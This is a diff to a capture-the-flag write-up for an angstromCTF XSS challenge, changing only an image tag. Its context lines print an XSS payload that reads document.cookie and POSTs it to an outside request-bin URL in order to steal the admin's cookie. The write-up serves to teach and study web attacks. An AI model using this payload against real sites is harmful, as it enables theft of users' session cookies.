@@ -642,7 +642,7 @@ We aren't really required to understand this code completely. In fact, just expe
 We can test that this works by trying `<Img src = x onerror = "javascript: alert(1)">` and seeing that an alert pops up when we view the post page.
 Now that we have a working XSS attack, we need to get the flag. We know the flag is stored as a cookie, so if we can somehow read the cookie from the admin's browser, we get the flag. Since the post website is on the same domain as the domain that the cookie is set for, `document.cookie` will return a string containing the flag. So the idea is to write a script that will get this value and send it to us. We can use a simple [request bin](https://pipedream.com/) to capture the requests. Our XSS attack should look something like this: `<Img src = x onerror = "javascript: fetch('https://enymfhr00jcem.x.pipedream.net/', { method: 'POST', body: document.cookie })"/>`. We create the post, report it to the admin and check our request bin for the flag.
 
-![flag.png](posts/assets/angstromctf-dom-validator-flag.png =300x1)
+<img src="posts/assets/angstromctf-dom-validator-flag.png" width="500"/>
 
 
 ### Notes
